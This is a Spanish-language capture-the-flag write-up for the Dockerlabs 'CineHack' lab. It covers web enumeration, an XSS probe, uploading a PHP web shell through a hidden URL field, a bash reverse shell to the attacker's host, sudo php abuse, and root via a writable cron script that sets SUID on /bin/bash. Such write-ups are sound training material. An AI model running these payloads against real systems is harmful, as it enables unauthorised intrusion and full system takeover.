
# Writeup Template: Maquina `[ CineHack ]`

- Tags: #CinaHack
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina CineHack](https://mega.nz/file/qQElkZ5K#Buv0R6SQBuj_ZImKWIks80BxwhDMyJVtYEZVXP3M9Xw)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x cinehack.zip
sudo bash auto_deploy.sh cinehack.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNobel))
```
---

## Enumeracion de [Servicio Web Principal] `CMS WordPress`
direccion **URL** del servicio: Tenemos **hostdiscovery** 
```bash
http://cinema.dl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://cinema.dl/
http://cinema.dl/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Cine Profesional], probably WordPress
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 cinema.dl
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://cinema.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://cinema.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 7502]
/reservation.php      (Status: 200) [Size: 1779]
```

Revisando el codigo fuente en esta url:
```bash
http://cinema.dl/reserva.html
```

Tenemos este fragmento de codigo **HTML**
```html
<!-- Popup para reserva -->
        <div id="popup" class="popup">
            <div class="popup-content">
                <button id="close-popup" class="close-popup">X</button>
                <h2>Confirmar Reserva</h2>
                <form action="[reservation.php](view-source:http://cinema.dl/reservation.php)" method="POST">
                    <label for="name">Nombre:</label>
                    <input type="text" id="name" name="name" required>

                    <label for="email">Correo electrónico:</label>
                    <input type="email" id="email" name="email" required>

                    <label for="phone">Teléfono:</label>
                    <input type="tel" id="phone" name="phone" required>

                    <!-- Campo oculto para URL maliciosa -->
                    <input type="hidden" id="problem_url" name="problem_url" value="">

                    <button type="submit">Confirmar</button>
                </form>
            </div>
        </div>
```

###### Confirmar Reservas:
En este formulario para confirmar las reservar es vulnerable a **XSS** pero para que pueda pensar en un ataque donde puedamor robar la cookie de sesion del usaurio que este logueado necesitamos interaccion con el usuario, 
Campo: **Nombre** es vulnerable
```bash
<script>alert("hacked");</script>
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora si intentamos **confirmarReservas** ahora tendremos un nuevo campo que nos permite ingresar una **URL**:
Sabiendo que apunta a un parametro: **problem_url** Nos aprovecharemos de esto para cargar un archivo malicioso:
Primero creamos un archivo malicioso bajo el nombre **cmd.php** que nos permite realizar una llamada a nivel de sistema para ejeucutar comandos:
```php
<?php
  system($_GET["cmd"]);
?>
```

Una ves creado montamos un servidor **python3** para dejar accesible nuestro **cmd.php** malicioso
```bash
python3 -m http.server 80
```
### Ejecucion del Ataque
Ahora sabemos que para el campo oculto si la vilidacion es realizada desde el navegador del usuario podemos aprovecharnos para elimiar la validacion quitendo el **hidden** en el tipo:
Una ves listo el archivo **malicioso** y el servidor con python, Desde las **herramientas de desarrollador** del navegador: Dejamos el campo **hidden** descativado:
```bash
<input id="problem_url" name="problem_url" value="" type=""> # Type Vacio
```

Ahora apartamos un aciento y damos en **reservarAsiento**, Tendremos un campo que nos permite abusar del parametro **problem_url** para apuntar a nuestro archivo malicioso de la siguiete forma:
```bash
http://cinema.dl/reservation.php?problem_url=http://172.17.0.1:80/cmd.php
```

Vemos que recibimos una peticion logrando cargar el archivo malicioso, ahora falta encontrar donde es que se almacena:
Ahora vamos a generar un diccionario permsonalizado en base a estos nombres;
```bash
andrew garfield
florence pugh
```

Con nuestra herramienta en python3 que nos permite generar un diccionario permsonalizado:
```bash
genPasswd.py -i 
```

Una ves obtenido el diccionario personalizado lo usaremos para **fuzzear** nuevas rutas:
```bash
gobuster dir -u http://cinema.dl/ -w cinema.txt --add-slash
```

Tenemos un directorio valido:
```bash
/andrewgarfield/      (Status: 200) [Size: 1148]
```

Ingresamos a la ruta y vemos que si es valida y en ella se encuentran dos archiovos, Inculyendo nuestro archivo malicisos **cmd.php**
```bash
http://cinema.dl/andrewgarfield/
```

Ahora usaremos nuestro script para ver si podemos ejecutar comandos en la maquina victima:
```bash
# Comandos para explotación
http://cinema.dl/andrewgarfield/cmd.php?cmd=whoami
```

### Intrusion
Modo escucha para ganar acceso al **target**
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://cinema.dl/andrewgarfield/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---
## Escalada de Privilegios
###### Usuario `[ www-data ]`:
Listando los permisos para este usuario, Tenemos lo siguiente:
```bash
sudo -l

User www-data may run the following commands on dockerlabs:
    (boss) NOPASSWD: /bin/php # Tenemos una via potencila de migrar a otro usuario
```

Explotamos el privilegio:
```bash
# Comando para escalar al usuario: ( boot )
sudo -u boss /bin/php -r 'system("/bin/bash");'
```

###### Usuario `[ boss ]`:
Logramos ganar acceso como este usuario pero en el sistema algo nos cierta la sesion:
Listando los procesos del sistema vemos que se esta ejecutando este:
```bash
/var/spool/cron/crontabs/root.sh;
```

No podemos acceder a el pero listando los permisos:
```bash
ls -l /var/spool/cron/        

dr-xrwx--T 2 boss crontab 4096 Jan 16 13:02 crontabs
```

Como usuario propietario solo puede verlo **boss**, Ahora sabiendo que como usuario **www-data** tenemos el banario de **php** el cual nos aprovechamos para ver si podemos leer el contendio
```bash
sudo -u boss /bin/php -r 'readfile(getenv("/var/spool/cron/crontabs/root.sh"));' # No permite leer el contenido
```

Revisando mas directorios tenemos el siguiente:
```bash
ls -la /opt

update.sh
```

Ahora revisando su contenido:
```bash
cat /opt/update.sh
```

Vemos que 
```bash
#!/bin/bash

# Comprobar si el usuario 'boss' tiene algún proceso en ejecución
# También buscar procesos asociados a "script" o shells indirectas
if pgrep -u boss > /dev/null; then
    # Mostrar procesos activos del usuario boss para depuración (opcional)
    echo "Procesos activos del usuario boss:"
    ps -u boss

    # Matar todos los procesos del usuario 'boss' incluyendo 'script'
    pkill -u boss
    pkill -9 -f "script"

    # Confirmar que los procesos fueron terminados
    if pgrep -u boss > /dev/null; then
        echo "No se pudieron terminar todos los procesos del usuario boss."
    else
        echo "El usuario boss ha sido desconectado por seguridad."
    fi
else
    echo "El usuario boss no está conectado."
fi
```

Vemos que nos matan la sesion en cuanto nos conectemos como el usuario **boss** asi que tenemos que ver la manera de mantener la sesion activa sin que maten el **proceso**
Ahora en esta ruta **/var/spool/cron** intentamos migrar como **boss** permitiendo que mantengamos la sesion activa:
Estando en esta ruta alcansamos a leer el archivo antes de que nos saque de la sesion:
```bash
cat crontabs/root.sh

#!/bin/bash

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.JicO9c/crontab installed on Thu Jan 16 11:58:58 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

#*/1 * * * * chmod +r /var/spool/cron/crontabs/root
/opt/update.sh
/tmp/script.sh
```

Ahora que sabemos que se esta ejecutando en la ruta **/tmp/script.sh** como **root**, Y revisando en la ruta no existe ese archivo asi que nos podemos aprovechar de eso para crear una malicioso bajo el mismo nombre que nos permita dar privelegio **SUID** a la **bash** de **root**
```bash
www-data@dockerlabs:/tmp$ nano script.sh

chmod +x script.sh # Damos permiso de ejecucion
```

El contenido es:
```bash
chmod u+s /bin/bash
```

Ahora solo esperamos a que sea ejecutado:
```bash
ls -l /bin/bash

-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Logramos privilegios **SUID** a la **bash** de **root**, Ahora solo lanzamos la bash con privilegios:
```bash
bash -p
```

---

## Evidencia de Compromiso
Flags **Root**
```bash
bash-5.2# ls -la /root

-rw-r--r--  1 root root   33 Jan 15 12:41 root.txt
-rw-r--r--  1 root root    0 Jan 16 13:01 test
```

```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a subir al servidor un archivo malicioso que nos permita ganar acceso a el
2. Apredimos a aprovecharnos de tareas cron ejecutadas por **root**

## Recomendaciones de Seguridad
- Evitar ejecutar tareas **cron** con privilegios de **root** en directorios donde todos los usarios tengan capacidad de escritura: **/tmp**